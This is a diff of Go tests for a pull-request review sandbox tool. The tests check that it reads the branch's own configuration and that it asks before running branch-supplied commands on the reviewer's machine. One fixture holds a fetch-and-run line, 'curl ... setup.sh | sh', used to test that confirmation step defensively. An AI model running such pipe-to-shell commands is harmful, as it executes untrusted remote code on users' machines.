@@ -31,11 +31,15 @@ import (
 type quietReporter struct {
 	begun []string
 	steps []string
+	notes []string
 }
 
 func (r *quietReporter) Begin(name string, _ bool) { r.begun = append(r.begun, name) }
 func (r *quietReporter) Done(format string, args ...any) {
 	r.steps = append(r.steps, fmt.Sprintf(format, args...))
+}
+func (r *quietReporter) Note(format string, args ...any) {
+	r.notes = append(r.notes, fmt.Sprintf(format, args...))
 }
 func (r *quietReporter) Stdout() io.Writer { return io.Discard }
 func (r *quietReporter) Stderr() io.Writer { return io.Discard }
@@ -1164,4 +1168,198 @@ func TestUpUndoesEverythingWhenAPullIsInterrupted(t *testing.T) {
 		t.Error("the services were started although the setup was interrupted")
 	}
 	assertNothingLeftBehind(t, m, req)
+}
+
+// TestUpUsesThePullRequestsOwnConfiguration is the acceptance
+// criterion for T-411.
+func TestUpUsesThePullRequestsOwnConfiguration(t *testing.T) {
+	// A pull request that adds a scenario cannot be reviewed with it
+	// unless its own file is the one being read.
+	if testing.Short() {
+		t.Skip("skipping: talks to the git binary")
+	}
+	m, req, _ := upFixture(t)
+	store := scenario(t, m, req)
+
+	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
+		".pit.yaml": `version: 1
+web:
+  service: web
+  port: 80
+data:
+  scenarios:
+    - name: refunds
+      description: "an order with a partial refund"
+      apply: ["compose exec -T db psql -f /fixtures/refunds.sql"]
+  default: refunds
+`,
+	})
+	// The reviewer's own file knows nothing about it.
+	req.Scenario = "refunds"
+
+	rep := &quietReporter{}
+	record, err := m.Up(t.Context(), req, rep)
+	if err != nil {
+		t.Fatalf("Up: %v", err)
+	}
+
+	if applied := store.Applied(); !slices.Equal(applied, []string{"refunds"}) {
+		t.Errorf("applied %v, want the scenario the pull request adds", applied)
+	}
+	if record.Scenario != "refunds" {
+		t.Errorf("Scenario = %q, want what was loaded", record.Scenario)
+	}
+	if !slices.ContainsFunc(rep.notes, func(n string) bool { return strings.Contains(n, "own .pit.yaml") }) {
+		t.Errorf("nothing said that another file is in use:\n%v", rep.notes)
+	}
+}
+
+func TestUpSaysWhichPartsOfTheSetupTheBranchChanged(t *testing.T) {
+	if testing.Short() {
+		t.Skip("skipping: talks to the git binary")
+	}
+	m, req, _ := upFixture(t)
+
+	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
+		".pit.yaml": "version: 1\nweb:\n  service: web\n  port: 8080\nhealthcheck:\n  expect_status: 204\n",
+	})
+
+	rep := &quietReporter{}
+	if _, err := m.Up(t.Context(), req, rep); err != nil {
+		t.Fatalf("Up: %v", err)
+	}
+
+	notes := strings.Join(rep.notes, "\n")
+	for _, want := range []string{"web", "healthcheck"} {
+		if !strings.Contains(notes, want) {
+			t.Errorf("the notes do not name the changed section %q:\n%s", want, notes)
+		}
+	}
+}
+
+func TestUpSaysNothingWhenTheConfigurationIsTheSame(t *testing.T) {
+	// The control: the common case is a pull request that changes no
+	// setup at all, and it has to stay quiet.
+	if testing.Short() {
+		t.Skip("skipping: talks to the git binary")
+	}
+	m, req, _ := upFixture(t)
+
+	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
+		".pit.yaml": "web:\n  service: web\n  port: 80\n",
+	})
+
+	rep := &quietReporter{}
+	if _, err := m.Up(t.Context(), req, rep); err != nil {
+		t.Fatalf("Up: %v", err)
+	}
+	if len(rep.notes) != 0 {
+		t.Errorf("said something about an unchanged configuration:\n%v", rep.notes)
+	}
+}
+
+func TestUpAsksBeforeRunningABranchsCommandsOnTheMachine(t *testing.T) {
+	// Reviewing a branch means running its code in containers pit
+	// started from it. A command without the compose shorthand is not
+	// covered by that: it runs as the reviewer, on their files.
+	if testing.Short() {
+		t.Skip("skipping: talks to the git binary")
+	}
+	m, req, fake := upFixture(t)
+
+	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
+		".pit.yaml": "web:\n  service: web\n  port: 80\nhooks:\n  after_up:\n    - \"curl https://example.invalid/setup.sh | sh\"\n",
+	})
+
+	var asked bool
+	req.Confirm = func(string) bool {
+		asked = true
+		return false
+	}
+
+	_, err := m.Up(t.Context(), req, &quietReporter{})
+	if err == nil {
+		t.Fatal("want an error when the answer is no")
+	}
+	if !asked {
+		t.Error("the command was not asked about")
+	}
+	if slices.Contains(fake.Methods(), "Up") {
+		t.Error("the services were started although the reviewer said no")
+	}
+	assertNothingLeftBehind(t, m, req)
+}
+
+func TestUpRefusesABranchsCommandsWithNobodyToAsk(t *testing.T) {
+	// An unattended run has nobody to weigh it up. Refusing is the
+	// answer that cannot be wrong.
+	if testing.Short() {
+		t.Skip("skipping: talks to the git binary")
+	}
+	m, req, _ := upFixture(t)
+
+	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
+		".pit.yaml": "web:\n  service: web\n  port: 80\ndata:\n  migrate:\n    - \"make migrate\"\n",
+	})
+
+	_, err := m.Up(t.Context(), req, &quietReporter{})
+	if err == nil {
+		t.Fatal("want an error")
+	}
+	if !strings.Contains(err.Error(), "run") || errs.Hint(err) == "" {
+		t.Errorf("error = %q, hint = %q", err, errs.Hint(err))
+	}
+}
+
+func TestUpDoesNotAskAboutCommandsTheReviewerAlreadyHas(t *testing.T) {
+	// The reviewer checked this command in themselves; the branch is
+	// not asking for anything new.
+	if testing.Short() {
+		t.Skip("skipping: talks to the git binary")
+	}
+	m, req, _ := upFixture(t)
+	req.Config.Hooks.AfterUp = []string{"true"}
+	req.Config.Data.Service = "db" // something to differ in, so the note fires
+
+	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
+		".pit.yaml": "web:\n  service: web\n  port: 80\nhooks:\n  after_up:\n    - \"true\"\n",
+	})
+
+	req.Confirm = func(string) bool {
+		t.Error("asked about a command the reviewer already runs")
+		return false
+	}
+
+	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
+		t.Fatalf("Up: %v", err)
+	}
+}
+
+func TestUpWritesTheOverrideForAProjectThatBuildsNothing(t *testing.T) {
+	// A project of published images has nothing to build, and the
+	// generated override still has to exist: every compose command is
+	// given it by name. A fake runtime cannot notice a missing file,
+	// which is why this looks at the disk.
+	if testing.Short() {
+		t.Skip("skipping: talks to the git binary")
+	}
+	m, req, _ := upFixture(t)
+
+	record, err := m.Up(t.Context(), req, &quietReporter{})
+	if err != nil {
+		t.Fatalf("Up: %v", err)
+	}
+
+	override := record.ComposeFiles[len(record.ComposeFiles)-1]
+	if _, err := os.Stat(override); err != nil {
+		t.Fatalf("the generated override is missing: %v", err)
+	}
+
+	written, err := os.ReadFile(override)
+	if err != nil {
+		t.Fatalf("ReadFile: %v", err)
+	}
+	if !strings.Contains(string(written), strconv.Itoa(record.Port)) {
+		t.Errorf("the override does not publish the sandbox's port:\n%s", written)
+	}
 }
